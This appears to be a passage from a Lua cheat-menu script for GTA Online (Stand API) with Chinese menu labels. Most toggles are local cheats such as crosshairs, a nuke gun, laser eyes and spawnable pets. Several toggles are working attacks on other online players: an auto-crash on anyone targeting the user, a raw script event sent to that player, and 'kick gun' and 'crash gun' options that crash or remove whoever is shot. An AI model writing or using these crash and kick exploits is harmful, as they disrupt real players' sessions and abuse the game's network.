    local userPed = players.user_ped()

    if playerIsTargetingEntity(userPed) and karma[userPed] then

        crashPlayer(karma[userPed].ped, true, expSettings)

    end

end)



menu.toggle_loop(mzcf, '拉海滩', {''}, '自动拉海滩', function()

    local userPed = players.user_ped()

    if playerIsTargetingEntity(userPed) and karma[userPed] then

        local karmaPid = karma[userPed].pid

        util.trigger_script_event(1 << karmaPid, {-93722397 ,1, 0, 0, 4,0,karmaPid, karmaPid})

    end

end)



  menu.toggle_loop(mzcf, '无差别崩', {''}, '如果有sb打你,无差别崩溃全局', function()

        local userPed = players.user_ped()

        if playerIsTargetingEntity(userPed) and karma[userPed] then

            heezyPlayer(karma[userPed].ped, true, expSettings)

        end

    end)

    local zhunxin = menu.list(weapon_features, "准星", {}, "", function(); end)
menu.toggle_loop(zhunxin, "瞄准准星 (!)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("!")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (#)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("#")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 ($)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("$")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (^)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("^")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.486,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (&)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("&")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (*)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("*")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.485,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (+)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("+")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.477,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (·)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("·")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.49997,0.478,0)
end)

menu.toggle_loop(weapon_features, "随机射出PED", {""}, "", function()

	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())

	local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)

	if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then 

		pedspawn = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)

		ENTITY.SET_ENTITY_ROTATION(pedspawn, rot.x, rot.y, rot.z, 1, false)

		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(pedspawn, 1, 0, 1000, 0, false, true, true, true)

	end

end)

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = toDirection(CAM.GET_GAMEPLAY_CAM_ROT(0))
    local destination =
    {
        x = cam_pos.x + direction.x * distance,
        y = cam_pos.y + direction.y * distance,
        z = cam_pos.z + direction.z * distance
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x,
            cam_pos.y,
            cam_pos.z,
            destination.x,
            destination.y,
            destination.z,
            flag,
            -1,
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] != 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end

local remove_projectiles = false
local function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

weapon_features_delay = 100
menu.toggle(weapon_features, "武器连发", {}, "", function(state)
    loop = state
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),2481070269,9999,true,true)
    while loop do
        local player_ped = players.user_ped()
        if PED.IS_PED_SHOOTING(player_ped) then
            local weapon <const> = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
            WEAPON.SET_CURRENT_PED_WEAPON(player_ped, 2481070269, true)
            util.yield(weapon_features_delay)
            WEAPON.SET_CURRENT_PED_WEAPON(player_ped, weapon, true)
        end
        util.yield()
    end
end)

menu.slider(weapon_features, "连发延迟", {""}, "", 1, 350, 100, 50, function(value)
    weapon_features_delay = value
end)

local nuke_gun_toggle = menu.toggle(weapon_features, "核弹枪", {'nukeGun'}, "使用RPG发射核弹", function(toggle)
    nuke_running = toggle
    if nuke_running then
        if animals_running then menu.trigger_command(exp_animal_toggle, 'off') end
        util.create_tick_handler(function()
            if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then --if holding homing launcher
                if PED.IS_PED_SHOOTING(players.user_ped()) then
                    if not remove_projectiles then
                        remove_projectiles = true
                        disableProjectileLoop(-1312131151)
                    end
                    util.create_thread(function()
                        local hash = util.joaat('w_arena_airmissile_01a')
                        STREAMING.REQUEST_MODEL(hash)
                        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                        local dir, pos = direction()
                        local bomb = entities.create_object(hash, pos)
                        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                        ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                        local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                        entities.delete(bomb)
                        executeNuke(nukePos)
                    end)
                else
                    remove_projectiles = false
                end
            else
                remove_projectiles = false
            end
            return nuke_running
        end)
    end
end)

menu.toggle_loop(weapon_features, "一拳超人", {"OnePunchMan"}, "", function()

    yqcr()
    
    end)
    

weaponback = off

menu.toggle(weapon_features, "背藏武器", {}, "", function(on)

    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())

	weaponback = on

	if weaponback then

		spawnweapon = 0

	end

	curweap = HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())

	if not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == -1569615261) and weaponback then

		spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0)

		attachweapon(spawnweapon)

	end

	while weaponback do

		if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(plyped()) == 0) then

			if not (spawnweapon == 0) then

				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)

			end

		else

			ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)

		end

		if not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == curweap) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == -1569615261) then

			if not (spawnweapon == 0) then

				entities.delete_by_handle(spawnweapon)

			end

			curweap = HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())

			requestweapon(curweap)

			spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0)

			if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(plyped()) == 0) then

				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)

			else

				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)

			end

			attachweapon(spawnweapon)

		end

		util.yield()

	end

	entities.delete_by_handle(spawnweapon)

end)

menu.toggle_loop(weapon_features, "神指", {"godfinger"}, "按B使用", function()
    godfinger()
end)

menu.toggle(weapon_features, "太刀",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_cs_katana_01"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.07, 0, 0, -100, 0.0, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0

			for k,ent in pairs(entities.get_all_objects_as_handles()) do

				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)

				entities.delete_by_handle(ent)

				count = count + 1

				util.yield()

			end
    end

end)

local bigbarrelqq = false
        menu.toggle(weapon_features, "大锤", {"bighammer"}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)--h4_prop_h4_barrel_01a
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbarrelqq = on
            else
                util.yield(100)
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbarrelqq = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

        local hash <const> = util.joaat("VEHICLE_WEAPON_PLAYER_LAZER")
        local showNotification = true
        local lastShot = newTimer()
        local sound = Sound.new("Fire_Loop", "DLC_IE_VV_Gun_Player_Sounds")


        local DisableControlActions = function()
            PAD.DISABLE_CONTROL_ACTION(0, 106, true)
            PAD.DISABLE_CONTROL_ACTION(0, 122, true)
            PAD.DISABLE_CONTROL_ACTION(0, 135, true)
            PAD.DISABLE_CONTROL_ACTION(0, 140, true)
            PAD.DISABLE_CONTROL_ACTION(0, 141, true)
            PAD.DISABLE_CONTROL_ACTION(0, 142, true)
            PAD.DISABLE_CONTROL_ACTION(0, 263, true)
            PAD.DISABLE_CONTROL_ACTION(0, 264, true)
        end


        menu.toggle_loop(weapon_features, "激光眼", {}, "按E键", function(on)
            laser_eyes()
        end)
function request_ptfx_asset_lasereyes(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(51, 51) then
        local inst = v3.new()
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        camAim_x, camAim_y, camAim_z = v3.get(inst)
        local ped_model = ENTITY.GET_ENTITY_MODEL(players.user_ped())
        local left_eye_id = 0
        local right_eye_id = 0
        pluto_switch ped_model do 
            case 1885233650:
            case -1667301416:
                left_eye_id = 25260
                right_eye_id = 27474
                break
            case 225514697:
            default:
                left_eye_id = 5956
                right_eye_id = 6468
        end
        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z += 0.02
            boneCoord_R.z += 0.02
        end
        camRot.x += 90
        request_ptfx_asset_lasereyes(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
    end
end






        menu.toggle_loop(weapon_features, "镭射眼", {"combustionman"}, "", function()
        
            HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
            DisableControlActions()
            if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
                WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
            end
        
            if not PAD.IS_DISABLED_CONTROL_PRESSED(51, 51) then
                if not sound:hasFinished() then
                    sound:stop()
                end
            elseif lastShot.elapsed() > 100 then
                local pos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0x322C, 0.0, 0.0, 0.0)
                local offset = get_offset_from_cam(80)
                if  sound:hasFinished() then
                    sound:playFromEntity(players.user_ped())
                    AUDIO.SET_VARIABLE_ON_SOUND(sound.Id, "fireRate", 10.0)
                end
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                    pos.x, pos.y, pos.z,
                    offset.x, offset.y, offset.z,
                    200,
                    true,
                    hash, players.user_ped(), true, true, -1.0
                )
                lastShot.reset()
            end
        end, function()
            if not sound:hasFinished() then
                sound:stop()
            end
        end)



        menu.toggle_loop(weapon_features, "踢出枪", {"kickgun"}, "", function()
            local ent = get_aim_info()['ent']
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if ENTITY.IS_ENTITY_A_PED(ent) then
                    if PED.IS_PED_A_PLAYER(ent) then
                        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                        if players.get_host() == pid then 
                            notification("您正试图踢出的玩家是主机")
                            return
                        end
                        menu.trigger_commands("kick" .. players.get_name(pid))
                    end
                end
            end
        end)

        menu.toggle_loop(weapon_features, "崩溃枪", {"crashgun"}, "", function()
            local ent = get_aim_info()['ent']
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if ENTITY.IS_ENTITY_A_PED(ent) then
                    if PED.IS_PED_A_PLAYER(ent) then
                        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                        menu.trigger_commands("crash" .. players.get_name(pid))
                    end
                end
            end
        end)
        function soul_conversion(soul)
            request_model_load(soul)
             while(not STREAMING.HAS_MODEL_LOADED(soul))
             do
             util.yield(10)
               end
               PLAYER.SET_PLAYER_MODEL(players.user(),soul)
               STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(soul)
        end
        --STREAMING.REQUEST_MODEL(2905870170)
        --util.yield(10)
                --PLAYER.SET_PLAYER_MODEL(players.user(),2905870170)
                
        menu.toggle_loop(weapon_features, "转魂枪", {""}, "距离太远可能会不起作用", function()
            local ent = get_aim_info()['ent']
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if ENTITY.IS_ENTITY_A_PED(ent) then
                    pos = ENTITY.GET_ENTITY_COORDS(ent, false)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos.x, pos.y, pos.z, false, false, false)
                    if PED.IS_PED_A_PLAYER(ent) then
                        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                        menu.trigger_commands("copyoutfit " .. players.get_name(pid))
                    else
                    local soul = ENTITY.GET_ENTITY_MODEL(ent)
                    STREAMING.REQUEST_MODEL(soul)
                    while(not STREAMING.HAS_MODEL_LOADED(soul))
                    do
                    util.yield(10)
                        end
                    PLAYER.SET_PLAYER_MODEL(players.user(),soul)
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(soul)
                    if not PED.IS_PED_A_PLAYER(ent) then
                        entities.delete_by_handle(ent)
                    end
                    util.yield(10)
                    menu.trigger_commands("allguns")
                end
            end
                if ENTITY.IS_ENTITY_A_VEHICLE(ent) then
                    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
                if VEHICLE.GET_VEHICLE_NUMBER_OF_PASSENGERS(ent,true,false) >= 1 then
                    local soulveh = ENTITY.GET_ENTITY_MODEL(driver)
                    if not PED.IS_PED_A_PLAYER(driver) then
                        entities.delete_by_handle(driver)
                        end
                        STREAMING.REQUEST_MODEL(soulveh)
                        while(not STREAMING.HAS_MODEL_LOADED(soulveh))
                        do
                        util.yield(10)
                            end
                    PLAYER.SET_PLAYER_MODEL(players.user(),soulveh)
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(soulveh)
                    util.yield(10)
                    PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
                    menu.trigger_commands("allguns")
                    end
                end
            end
    end)


        bones  = {
            26612,	-- left hand
            58868,	-- right hand
        }
        menu.toggle(weapon_features, "火拳艾斯",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("fire_wrecked_plane_cockpit", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)
        
        menu.toggle(weapon_features, "雷电拳",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("scr_reconstructionaccident")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_reconstructionaccident")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)
        
        menu.toggle(weapon_features, "血拳V1",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("blood_mist_prop", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)
        
        menu.toggle(weapon_features, "血拳V2",{""}, "",function(state)
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scrape_blood_car", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
                end
            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)

local myroot = menu.list(interesting_features, "宠物选项", {}, "", function(); end)
local allpetsroot = menu.list(myroot, "所有宠物", {}, "")
local activepet = menu.list(myroot, "管理宠物", {}, "这些是你生成的宠物")

        menu.toggle(allpetsroot, "无敌", {}, "给你所有宠物无敌", function(on)
            if on then
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, true)
                end
            else
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, false)
                end
            end
        end)

        menu.action(allpetsroot, "删除所有宠物", {}, "", function()
            for k,v in pairs(activedogs) do
                entities.delete_by_handle(v)
            end
        end)
       
menu.action_slider(myroot, "生成一只宠物", {}, "生成一个忠诚的同伴,它将跟随并保护你.", dogs, function(opt, breeds)
    local hash = util.joaat("A_C_" .. breeds)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, math.random(1,4), 0)
    if getgroupsize(mygroup) >= 7 then
        notification("你已超过宠物的最大数量.")
    else
        local dog_ped = entities.create_ped(26, hash, coords, 0)
        activedogs[#activedogs+1] = dog_ped
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_NEVER_LEAVES_GROUP(dog_ped, true)
        PED.SET_GROUP_SEPARATION_RANGE(mygroup, 99999)

        local thispet = menu.list(activepet, breeds, {}, "")



        menu.text_input(thispet, "设置名字", {"setname"}, "", function(name)
            GenerateNametagOnPed(dog_ped, name)
        end)

        menu.toggle(thispet, "无敌", {}, "", function(on)
            if on then
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, true)
            else
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, false)
            end
        end)



        if breeds ~= "Cat_01" then

            menu.toggle(thispet, "坐下", {}, "让您的宠物坐下.", function(on)
                if on then
                    if breeds == "Rottweiler" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[1], 0, true)
                    elseif breeds == "Retriever" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[2], 0, true)
                    elseif breeds == "Shepherd" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    elseif breeds == "Husky" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    else
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[4], 0, true)

                    end
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)



            menu.action(thispet, "汪汪", {}, "汪汪汪!", function()
                if breeds == "Rottweiler" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_ROTWEILER", 0, true)
                elseif breeds == "Retriever" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_RETRIEVER", 0, true)
                elseif breeds == "Shepherd" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                elseif breeds == "Husky" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                else
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SMALL", 0, true)
                end
                util.yield(5000)
                TASK.CLEAR_PED_TASKS(dog_ped)
            end)
        end



        if breeds == "Cat_01" then 
            menu.toggle(thispet, "躺下放松", {}, "", function(on)
                if on then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_CAT_SLEEPING_GROUND", 0, true)
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)
        end


        menu.action(thispet, "删除宠物", {}, "和平中撕扯, 我毛茸茸的朋友", function()
            entities.delete_by_handle(dog_ped)
            menu.delete(thispet)
        end)
    end
end)

local damage_numbers_list = menu.list(interesting_features, "伤害数字")
local homerdq = menu.list(interesting_features, "Homer", {}, "", function(); end)


menu.toggle_loop(damage_numbers_list, "伤害数字", {"damagenumbers"}, "", function()
    damage_numbers()
end)
menu.toggle(damage_numbers_list, "包括车辆", {"damagenumbersvehicles"}, "", function (value)
    damage_numbers_target_vehicles = value
end)
menu.slider(damage_numbers_list, "数字尺寸", {"damagenumberstextsize"}, "", 1, 100, 7, 1, function (value)
    damage_numbers_text_size = value * 0.1
end)
local damage_numbers_colours_list = menu.list(damage_numbers_list, "颜色设置")
